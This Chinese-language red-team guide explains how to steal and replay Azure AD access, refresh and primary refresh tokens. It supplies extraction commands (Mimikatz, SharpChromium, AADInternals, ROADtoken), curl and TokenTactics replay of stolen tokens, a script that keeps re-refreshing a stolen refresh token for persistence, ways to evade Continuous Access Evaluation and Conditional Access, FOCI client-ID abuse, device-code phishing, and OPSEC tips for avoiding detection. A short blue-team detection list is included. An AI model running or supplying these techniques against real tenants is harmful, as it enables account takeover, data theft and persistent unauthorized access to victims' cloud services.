# Azure AD Token 窃取与刷新攻击详解

## Token 类型概览

```
Azure AD Token 体系：
├─ Access Token (AT)
│   ├─ JWT 格式，含用户/应用声明
│   ├─ 默认有效期 60-90 分钟
│   ├─ 用于访问 Graph API / Azure Resource Manager 等
│   └─ 被窃后可直接 replay（无绑定机制，除非启用 CAE）
│
├─ Refresh Token (RT)
│   ├─ 不透明字符串（非 JWT）
│   ├─ 默认有效期 90 天（inactive 14 天过期）
│   ├─ 用于获取新的 AT + RT 对
│   ├─ 与 Client ID 绑定，但受 FOCI 影响
│   └─ Single-use（使用后旧 RT 失效，返回新 RT）
│
└─ Primary Refresh Token (PRT)
    ├─ 设备级别的 SSO token
    ├─ 存储在 TPM/LSA 中（Windows）
    ├─ Azure AD Join / Hybrid Join 设备自动获取
    ├─ 包含设备声明 → 可满足 Conditional Access 的设备合规要求
    └─ 窃取 PRT = 完全冒充该用户在该设备上的身份
```

## Token 提取位置

### 浏览器 Token 提取

```bash
# Chrome/Edge 中的 Azure AD Cookie
# ESTSAUTH / ESTSAUTHPERSISTENT — Azure AD 会话 Cookie
# 位置:
# Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies (SQLite)
# Windows: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies
# macOS: ~/Library/Application Support/Google/Chrome/Default/Cookies

# 使用 SharpChromium 提取
SharpChromium.exe cookies /edge /format:json

# 使用 Mimikatz 提取浏览器 Cookie
mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies"

# ⛔ ESTSAUTHPERSISTENT 可在其他设备上重放
# 直接设置该 Cookie → 获得 Azure AD 会话 → 用于获取新 Token
```

### MSAL Token Cache 提取

```bash
# Windows MSAL Cache 位置:
# %LOCALAPPDATA%\.IdentityService\msal.cache
# %LOCALAPPDATA%\.IdentityService\AccountStore.json
# 加密方式: DPAPI（当前用户上下文）

# 解密 MSAL Cache
# 方法 1: Mimikatz
mimikatz # dpapi::masterkey /in:%APPDATA%\Microsoft\Protect\<SID>\<GUID>
mimikatz # dpapi::blob /in:msal.cache /masterkey:<key>

# 方法 2: SharpMSAL
SharpMSAL.exe

# macOS Token Cache 位置:
# ~/Library/Group Containers/UBF8T346G9.Office/MicrosoftRegistrationDB.reg
# Keychain: login.keychain-db (搜索 "Microsoft" 相关条目)
```

### Azure CLI / PowerShell Token 提取

```bash
# Azure CLI Token Cache
# Windows: %USERPROFILE%\.azure\msal_token_cache.json
# Linux/macOS: ~/.azure/msal_token_cache.json
# ⛔ 此文件包含 Access Token + Refresh Token，明文 JSON！

# 查看 Azure CLI 当前 Token
cat ~/.azure/msal_token_cache.json | python3 -m json.tool

# Azure PowerShell Token Cache
# Windows: %USERPROFILE%\.Azure\TokenCache.dat (DPAPI)
# 或: %USERPROFILE%\.Azure\AzureRmContext.json

# 使用 AADInternals 获取当前会话 Token
Import-Module AADInternals
$at = Get-AADIntAccessTokenForMSGraph
$rt = Get-AADIntRefreshTokenForMSGraph
```

### PRT 提取

```bash
# PRT 存储在 LSA（Local Security Authority）中
# 需要 SYSTEM 权限或 SeDebugPrivilege

# 方法 1: Mimikatz（需要 SYSTEM）
mimikatz # privilege::debug
mimikatz # sekurlsa::cloudap

# 方法 2: ROADtoken（模拟 PRT 流程）
ROADtoken.exe

# 方法 3: AADInternals
Import-Module AADInternals
Get-AADIntUserPRTToken

# 输出 PRT 后，可用于生成新的 Access Token
# PRT 包含: 用户身份 + 设备声明 + Session Key（TPM 保护）
```

## Token Replay 攻击（Pass-the-Token）

### Access Token Replay

```bash
# 直接使用窃取的 Access Token 调用 API
# 无需密码/MFA，Token 本身就是凭据

# Graph API 调用
curl -H "Authorization: Bearer $STOLEN_ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me"

# Azure Resource Manager 调用
curl -H "Authorization: Bearer $STOLEN_ARM_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# 使用 Azure CLI
az account get-access-token  # 正常获取
# 或注入窃取的 Token
export AZURE_ACCESS_TOKEN=$STOLEN_TOKEN
az rest --method GET --url "https://graph.microsoft.com/v1.0/users"
```

### Refresh Token Replay

```bash
# Refresh Token 更有价值 — 可持续获取新 Access Token

# 使用 RT 获取新 AT（指定目标资源）
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "grant_type=refresh_token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c" \
  -d "refresh_token=$STOLEN_RT" \
  -d "scope=https://graph.microsoft.com/.default"

# 使用 TokenTactics
Import-Module TokenTactics
RefreshTo-MSGraph -refreshToken $STOLEN_RT -domain target.com
RefreshTo-AzureManagement -refreshToken $STOLEN_RT -domain target.com
RefreshTo-Outlook -refreshToken $STOLEN_RT -domain target.com
RefreshTo-MSTeams -refreshToken $STOLEN_RT -domain target.com
RefreshTo-DODMSGraph -refreshToken $STOLEN_RT  # DoD 环境
```

### PRT Replay（Pass-the-PRT）

```bash
# PRT → 获取任何 Azure AD SSO 资源的 Access Token
# 模拟设备上的 SSO 流程

# 使用 AADInternals
# 1. 提取 PRT + Session Key
$prt = Get-AADIntUserPRTToken

# 2. 用 PRT 获取 Access Token（任意资源）
$at = Get-AADIntAccessTokenWithPRT -PRTToken $prt -Resource "https://graph.microsoft.com"

# 3. 生成浏览器可用的 Cookie
# PRT → 转换为 x-ms-RefreshTokenCredential → 注入浏览器
# 可通过 Chrome DevTools 注入 Cookie 到 login.microsoftonline.com

# ⛔ PRT 的关键优势：包含设备声明
# 许多 Conditional Access 策略要求 "合规设备"
# 使用 PRT 可自动满足该要求，绕过 CA
```

## Refresh Token Rotation 与滥用

```
Refresh Token 生命周期：
├─ 首次认证 → 获得 RT₁
├─ 使用 RT₁ → 获得 AT₂ + RT₂（RT₁ 失效）
├─ 使用 RT₂ → 获得 AT₃ + RT₃（RT₂ 失效）
├─ ...循环...
│
├─ ⛔ 攻击窗口：
│   ├─ RT 单次使用，但有宽限期（约 15 分钟）
│   ├─ 在宽限期内，旧 RT 仍可使用
│   ├─ 攻击者和用户可能同时使用同一 RT
│   └─ 检测: Token reuse 会触发 Azure AD 异常检测
│
└─ 持久化策略：
    ├─ 定期刷新 RT（每隔几小时）保持活跃
    ├─ 不要在短时间内大量刷新（触发异常）
    └─ 使用不同 Client ID 获取多个 RT（FOCI 策略）
```

```bash
# RT 自动续约脚本（保持访问）
# 每 4 小时刷新一次
while true; do
  RESPONSE=$(curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
    -d "grant_type=refresh_token&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&refresh_token=$RT&scope=https://graph.microsoft.com/.default")
  AT=$(echo $RESPONSE | jq -r '.access_token')
  RT=$(echo $RESPONSE | jq -r '.refresh_token')
  echo "[$(date)] Token refreshed successfully"
  sleep 14400
done
```

## CAE (Continuous Access Evaluation) 绕过

```
CAE 机制：
├─ 传统: AT 在过期前一直有效（60-90 min）
├─ CAE: 资源提供者可实时检查 Token 是否仍有效
│   ├─ 用户禁用 → Token 立即失效
│   ├─ 密码修改 → Token 立即失效
│   ├─ 位置变化 → Token 可能失效
│   └─ 风险检测 → Token 可能失效
│
└─ CAE Token 特征:
    ├─ JWT 中 "xms_cc" claim 包含 "cp1"
    ├─ AT 有效期延长至 24 小时（但可被撤销）
    └─ 仅支持部分资源: Exchange, SharePoint, Teams, Graph
```

### CAE 绕过方法

```bash
# 方法 1: 使用不支持 CAE 的 Client ID
# 许多旧版应用/Client ID 不请求 CAE，获取的 Token 无 "cp1" claim
# 使用 Azure CLI Client ID: 04b07795-a71b-4346-935f-02f9a1efa4ce
# 使用 Azure PowerShell Client ID: 1950a258-227b-4e31-a9cf-717495945fc2

curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "grant_type=refresh_token" \
  -d "client_id=04b07795-a71b-4346-935f-02f9a1efa4ce" \
  -d "refresh_token=$RT" \
  -d "scope=https://graph.microsoft.com/.default"
# 返回的 AT 可能不包含 cp1 → 不受 CAE 实时撤销影响

# 方法 2: 利用 CAE 的传播延迟
# 即使启用 CAE，撤销信号传播需要时间（通常几分钟）
# 在管理员响应之前完成操作

# 方法 3: 避免触发 CAE 事件
# 不要修改密码、不要从异常位置登录
# 保持低调，使用与原始用户相同的 IP 范围
```

## FOCI (Family of Client IDs) 滥用

```
FOCI 原理:
├─ Microsoft 将部分第一方应用归为 "Family"
├─ 同一 Family 内的应用共享 Refresh Token
├─ 用应用 A 的 RT → 可获取应用 B 的 AT
├─ ⛔ 意味着: 窃取一个应用的 RT → 可访问多个服务
│
└─ 已知 FOCI Family 成员:
    ├─ Microsoft Office: d3590ed6-52b3-4102-aeff-aad2292ab01c
    ├─ Microsoft Teams: 1fec8e78-bce4-4aaf-ab1b-5451cc387264
    ├─ Microsoft Outlook: 27922004-5251-4030-b22d-91ecd9a37ea4
    ├─ Microsoft Edge: ecd6b820-32c2-49b6-98a6-444530e5a77a
    ├─ Microsoft Planner: 66375f6b-983f-4c2c-9701-d680650f588f
    ├─ Microsoft Office Web: 57fb890c-0dab-4253-a5e0-7188c88b2bb4
    ├─ OneDrive: ab9b8c07-8f02-4f72-87fa-80105867a763
    ├─ Bing: 2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8
    └─ ... 更多在 TokenTactics 中维护
```

```bash
# FOCI 滥用 — 从 Office RT 获取 Teams/Outlook/OneDrive AT

# 假设窃取了 Microsoft Office 的 RT
$officeRT = "0.AXkAj..."

# 获取 Teams 的 AT（使用 Teams 的 Client ID，但传入 Office 的 RT）
Import-Module TokenTactics
RefreshTo-MSTeams -refreshToken $officeRT -domain target.com

# 获取 Outlook 的 AT
RefreshTo-Outlook -refreshToken $officeRT -domain target.com

# 获取 Graph API 的 AT
RefreshTo-MSGraph -refreshToken $officeRT -domain target.com

# 获取 Azure Management 的 AT
RefreshTo-AzureManagement -refreshToken $officeRT -domain target.com

# 获取 OneDrive 的 AT
RefreshTo-OneDrive -refreshToken $officeRT -domain target.com

# ⛔ 关键点: 即使 Conditional Access 限制了某个应用
# 但如果 Family 中的另一个应用不受限制
# 可以通过不受限的应用获取 RT → 再 FOCI 到受限应用
```

## 实用工具详解

### TokenTactics

```powershell
# https://github.com/rvrsh3ll/TokenTactics
Import-Module .\TokenTactics.psd1

# Device Code Phishing → 获取初始 Token
Get-AzureTokenFromDeviceCode -Client MSGraph

# 使用 RT 切换到不同资源
RefreshTo-MSGraph -refreshToken $rt -domain target.com
RefreshTo-AzureManagement -refreshToken $rt -domain target.com
RefreshTo-MAMResource -refreshToken $rt -domain target.com
RefreshTo-DODMSGraph -refreshToken $rt -domain target.com
RefreshTo-Substrate -refreshToken $rt -domain target.com

# 解析 Token
Parse-JWTtoken -token $at
```

### AADInternals

```powershell
# https://github.com/Gerenios/AADInternals
Import-Module AADInternals

# Token 获取
$at = Get-AADIntAccessTokenForMSGraph
$at = Get-AADIntAccessTokenForAzureCoreManagement

# PRT 操作
$prt = Get-AADIntUserPRTToken
$at = Get-AADIntAccessTokenWithPRT -PRTToken $prt -Resource "https://graph.microsoft.com"

# Token 解析
Read-AADIntAccessToken -AccessToken $at

# Azure AD Connect 凭据提取（需要本地 Admin）
Get-AADIntSyncCredentials
```

### ROADtoken

```bash
# https://github.com/dirkjanm/ROADtoken
# 从 Azure AD Join 设备提取 PRT

# 运行（需要在 Azure AD Join 的设备上，SYSTEM 权限）
ROADtoken.exe

# 输出 PRT 和 Session Key
# 配合 ROADtools 使用
roadrecon auth --prt-cookie <cookie>
roadrecon gather
```

## 检测与 OPSEC

```
蓝队检测点:
├─ Azure AD Sign-in Logs:
│   ├─ 同一 RT 从不同 IP 使用 → 异常
│   ├─ 非常规 Client ID 获取 Token → 异常
│   ├─ 短时间内多次 Token 刷新 → 异常
│   └─ CAE 撤销后仍有 Token 使用 → 异常
│
├─ Sentinel / Defender for Identity:
│   ├─ "Anomalous Token" 警报
│   ├─ "Token Issuer Anomaly"
│   └─ "Primary Refresh Token Theft"
│
└─ 红队 OPSEC:
    ├─ 使用与目标相同地理位置的 VPN/Proxy
    ├─ 使用常见的 Client ID（Office、Teams 等）
    ├─ 避免短时间大量 API 调用
    ├─ RT 刷新间隔 > 1 小时
    └─ 不要从同一 IP 对多个用户 replay Token
```

## 攻击决策树

```
获取到凭据后:
├─ 是 Access Token?
│   ├─ 检查过期时间 (exp claim)
│   ├─ 检查 audience (aud claim) — 确定可访问的资源
│   ├─ 检查 scope/roles — 确定权限
│   ├─ 直接使用，同时尝试获取 RT
│   └─ 如果有 CAE (xms_cc: cp1) → 注意可能被撤销
│
├─ 是 Refresh Token?
│   ├─ 立即刷新获取 AT + 新 RT
│   ├─ 尝试 FOCI — 用不同 Client ID 获取多个服务的 AT
│   ├─ 确认 scope — offline_access 必须在原始授权中
│   └─ 定期刷新保持活跃（每 4-8 小时）
│
├─ 是 PRT?
│   ├─ 最高价值 — 等同于完全冒充用户
│   ├─ 可绕过 Conditional Access 的设备要求
│   ├─ 使用 AADInternals 或 ROADtoken 转换为 AT
│   └─ 注意: PRT 提取通常需要 SYSTEM 权限
│
└─ 是 Browser Cookie (ESTSAUTH)?
    ├─ 在攻击者浏览器中注入 Cookie
    ├─ 访问 portal.azure.com / office.com
    ├─ 手动操作 — 像目标用户一样使用
    └─ 导出时注意 Cookie 的 domain 和 path
```
